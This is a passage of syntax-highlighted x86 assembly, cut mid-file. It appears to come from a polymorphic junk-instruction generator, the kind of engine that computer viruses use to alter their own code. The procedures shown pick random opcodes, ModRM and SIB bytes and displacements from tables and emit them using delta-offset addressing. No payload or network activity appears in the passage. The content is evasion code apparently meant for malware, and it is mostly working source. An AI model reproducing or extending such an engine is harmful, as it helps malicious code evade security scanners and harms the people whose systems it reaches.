</span><span class="sc5">make_sure_junk</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">output_one_junk</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                            </span><span class="sc1">; This procedure outputs</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                  </span><span class="sc1">; one junk instruction</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_random_disp</span><span class="sc0">                   </span><span class="sc1">; First choose displacements</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">choose_another</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Table_numbers</span><span class="sc0">                    </span><span class="sc1">; Choose one instruction</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                            </span><span class="sc1">; table</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">we_create_jcond</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">; prevent reentry</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_case</span><span class="sc0">                               </span><span class="sc1">; when creating conditional</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                </span><span class="sc1">; jumps</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">choose_another</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">choose_another</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_case</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">flawable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">; if the instruction mustn't</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">go_on_unstopped</span><span class="sc0">                       </span><span class="sc1">; generate exception errors</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">; we cannot use table 1!</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">choose_another</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">go_on_unstopped</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">junk_table_procs</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; take out the procedure</span><span class="sc0">
      </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                   </span><span class="sc1">; and jump to it...</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">junk_proc1</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">; here we use table1</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">; save possible increment</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                </span><span class="sc1">; 2 or 3...</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Table1_len</span><span class="sc0">                       </span><span class="sc1">; take a random operation</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                            </span><span class="sc1">; from the Table1</span><span class="sc0">
      </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Table1</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lodsb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                              </span><span class="sc1">; toggle size</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModRM</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; take a modrm byte</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_jreg</span><span class="sc0">                          </span><span class="sc1">; choose the random jreg</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">                               </span><span class="sc1">; and a random addressing</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                            </span><span class="sc1">; type</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">row</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; save the row</span><span class="sc0">
      </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lodsb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                     </span><span class="sc1">; store modrm</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                </span><span class="sc1">; choose addressing type</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                </span><span class="sc1">; is it 32bit addressing?</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_32bit_addressing</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; if it's 16bit then we</span><span class="sc0">
      </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">                               </span><span class="sc1">; must go behind the opcode</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Address_size_toggle</span><span class="sc0">               </span><span class="sc1">; and put an Address size</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                     </span><span class="sc1">; toggle prefix there</span><span class="sc0">
      </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosw</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_16bit_addressing</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">row</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; restore row in edx</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">                                </span><span class="sc1">; DISP16 needed ?</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_exc_1</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">disp16</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosw</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">finish_processing_1</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_exc_1</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                                </span><span class="sc1">; Need to add a DISP8 ?</span><span class="sc0">
      </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">not_exc_2</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">not_exc_2</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">disp8</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">finish_processing_1</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_exc_2</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">                               </span><span class="sc1">; Need to add a DISP16 ?</span><span class="sc0">
      </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">not_exc_3</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">not_exc_3</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">disp16</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosw</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">finish_processing_1</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_exc_3</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">finish_processing_1</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_32bit_addressing</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">row</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; restore row in edx</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_exc_4</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">disp32</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosd</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">finish_processing_1</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_exc_4</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">need_sib</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">need_sib</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">need_sib</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                                </span><span class="sc1">; Need to add a DISP8 ?</span><span class="sc0">
      </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">not_exc_5</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">not_exc_5</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">disp8</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">finish_processing_1</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_exc_5</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">                               </span><span class="sc1">; Need to add a DISP32 ?</span><span class="sc0">
      </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">not_exc_6</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">not_exc_6</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">disp32</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosd</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">finish_processing_1</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_exc_6</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">finish_processing_1</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">need_sib</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">; if we need a SIB byte</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModRM</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; we compute it rite here...</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">need_sib</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">need_sib</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">need_sib</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lodsb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">maybe_32</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">disp8</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">finish_processing_1</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">maybe_32</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">finish_processing_1</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">disp32</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosd</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">finish_processing_1</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">finish_processing_1</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">over_one_junk</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">junk_proc2</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">; here we use Table 2</span><span class="sc0">
